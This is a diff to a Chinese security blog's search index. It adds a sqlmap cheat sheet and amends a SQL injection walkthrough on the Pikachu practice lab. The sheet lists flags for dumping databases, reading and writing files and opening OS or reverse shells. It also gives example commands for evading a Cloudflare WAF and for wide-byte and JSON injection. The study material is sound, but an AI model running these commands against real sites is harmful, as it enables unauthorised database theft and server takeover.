@@ -1436,7 +1436,158 @@ run
       </tags>
   </entry>
   <entry>
-    <title>sql注入-pikachu-正在学习编辑中.....</title>
+    <title>sqlmap</title>
+    <url>/2025/03/05/sqlmap/</url>
+    <content><![CDATA[<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>自动测试注入已找到的sql注入漏洞点</p>
+<h2 id="命令参数"><a href="#命令参数" class="headerlink" title="命令参数"></a>命令参数</h2><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><table>
+<thead>
+<tr>
+<th align="center">参数</th>
+<th align="left">详解</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">-u “url”</td>
+<td align="left">注入的url</td>
+</tr>
+<tr>
+<td align="center">–data</td>
+<td align="left">post请求payload</td>
+</tr>
+<tr>
+<td align="center">–cookie</td>
+<td align="left">cookie注入</td>
+</tr>
+<tr>
+<td align="center">–dbs</td>
+<td align="left">列出所有数据库</td>
+</tr>
+<tr>
+<td align="center">-tables</td>
+<td align="left">列出所有表</td>
+</tr>
+<tr>
+<td align="center">-D</td>
+<td align="left">指定数据库</td>
+</tr>
+<tr>
+<td align="center">-T</td>
+<td align="left">指定表</td>
+</tr>
+<tr>
+<td align="center">-C</td>
+<td align="left">指定字段</td>
+</tr>
+<tr>
+<td align="center">–dump</td>
+<td align="left">跟在上面指定的参数一起使用，列出指定的数据</td>
+</tr>
+<tr>
+<td align="center">–sql-shell</td>
+<td align="left">写shell</td>
+</tr>
+<tr>
+<td align="center">–batch</td>
+<td align="left">默认选择y</td>
+</tr>
+<tr>
+<td align="center">–eta</td>
+<td align="left">盲注，显示时间和优化</td>
+</tr>
+<tr>
+<td align="center">–os-cmd&#x3D;id</td>
+<td align="left">执行系统命令</td>
+</tr>
+<tr>
+<td align="center">–os-shell</td>
+<td align="left">系统交互shell</td>
+</tr>
+<tr>
+<td align="center">–os-pwn</td>
+<td align="left">反弹shell</td>
+</tr>
+<tr>
+<td align="center">–referer</td>
+<td align="left">使用referer欺骗</td>
+</tr>
+<tr>
+<td align="center">–users</td>
+<td align="left">列数据库所有用户</td>
+</tr>
+<tr>
+<td align="center">–threads</td>
+<td align="left">多线程</td>
+</tr>
+<tr>
+<td align="center">–file-read</td>
+<td align="left">读指定文件</td>
+</tr>
+<tr>
+<td align="center">–file-write</td>
+<td align="left">写入指定文件</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>示例</p>
+</blockquote>
+<ol>
+<li>post请求插入请求表单<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --data=&quot;id=1&amp;&quot; --batch</span><br></pre></td></tr></table></figure></li>
+<li>列出数据库系统用户<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --users -v 0</span><br></pre></td></tr></table></figure></li>
+<li>列出所有数据库名称<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --dbs --batch</span><br></pre></td></tr></table></figure></li>
+<li>列出指定数据库的表<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --tables -D &quot;数据库名称&quot; -tables --batch</span><br></pre></td></tr></table></figure></li>
+<li>列出指定表的数据<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --tables -D &quot;数据库名称&quot; -T &quot;表名&quot; --dump --batch</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="安全参数"><a href="#安全参数" class="headerlink" title="安全参数"></a>安全参数</h3><table>
+<thead>
+<tr>
+<th align="center">参数</th>
+<th align="left">详解</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">-proxy “url,url”</td>
+<td align="left">代理</td>
+</tr>
+<tr>
+<td align="center">–tamper</td>
+<td align="left">Tamper 脚本,混淆 Payload</td>
+</tr>
+<tr>
+<td align="center">–chunked</td>
+<td align="left">分块传输编码</td>
+</tr>
+<tr>
+<td align="center">–random-agent</td>
+<td align="left">随机化 HTTP 头</td>
+</tr>
+<tr>
+<td align="center">–delay&#x3D;5</td>
+<td align="left">请求延迟</td>
+</tr>
+<tr>
+<td align="center">–headers</td>
+<td align="left">–headers&#x3D;”X-Forwarded-For:1.1.1.1”添加自定义 HTTP 头</td>
+</tr>
+<tr>
+<td align="center">–charset</td>
+<td align="left">强制指定字符集,绕过转义字符</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>示例</p>
+</blockquote>
+<ol>
+<li>绕过 Cloudflare WAF<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://XXXXXXX.com?id=1&quot; \</span><br><span class="line">  --tamper=space2comment,randomcase,versionedmorekeywords \</span><br><span class="line">  --random-agent \</span><br><span class="line">  --delay=3 \</span><br><span class="line">  --dbms=MySQL \</span><br><span class="line">  --level=5 \</span><br><span class="line">  --risk=3</span><br></pre></td></tr></table></figure></li>
+<li>GBK 宽字节注入<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://XXXXXXX.com?id=1%df%27&quot; \</span><br><span class="line">  --charset=gbk \</span><br><span class="line">  --tamper=unmagicquotes \</span><br><span class="line">  --dbms=MySQL \</span><br><span class="line">  --dbs</span><br></pre></td></tr></table></figure></li>
+<li>JSON 参数注入<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://target.com/api&quot; \</span><br><span class="line">  --data=&#x27;&#123;&quot;id&quot;:&quot;1*&quot;&#125;&#x27; \</span><br><span class="line">  --param-del=&quot;:&quot; \</span><br><span class="line">  --headers=&quot;Content-Type: application/json&quot; \</span><br><span class="line">  --dbms=MySQL</span><br></pre></td></tr></table></figure></li>
+</ol>
+<blockquote>
+<p>-v #详细的等级(0-6)<br>0：只显示Python的回溯，错误和关键消息。<br>1：显示信息和警告消息。<br>2：显示调试消息。<br>3：有效载荷注入。<br>4：显示HTTP请求。<br>5：显示HTTP响应头。<br>6：显示HTTP响应页面的内容</p>
+</blockquote>
+]]></content>
+  </entry>
+  <entry>
+    <title>sql注入-pikachu</title>
     <url>/2025/02/27/sql%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><p>使用burp suite工具攻击<br>如果想要去除干扰信息，后面的id&#x3D;1可以改成非法id&#x3D;-2</p>
 <h3 id="获取当前数据库名称和版本"><a href="#获取当前数据库名称和版本" class="headerlink" title="获取当前数据库名称和版本"></a>获取当前数据库名称和版本</h3><ol>
@@ -1469,6 +1620,9 @@ run
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select your userid?</span><br><span class="line"></span><br><span class="line">hello,vince</span><br><span class="line">your email is: vince@pikachu.com</span><br><span class="line"></span><br><span class="line">hello,admin,pikachu,test</span><br><span class="line">your email is: e10adc3949ba59abbe56e057f20f883e,670b14728ad9902aecba32e22fa4f6bd,e99a18c428cb38d5f260853678922e03</span><br></pre></td></tr></table></figure></li>
 </ol>
 <h3 id="得到的密码进行解码"><a href="#得到的密码进行解码" class="headerlink" title="得到的密码进行解码"></a>得到的密码进行解码</h3><p>随便搜索在线解密<br><img src="/images/pasted-93.png" alt="upload successful"></p>
+<blockquote>
+<p>其他注入类型原理相似，通过找到SQL命令可执行的格式进行注入，通过sqlmap都能成功注入</p>
+</blockquote>
 ]]></content>
       <categories>
         <category>网络安全</category>
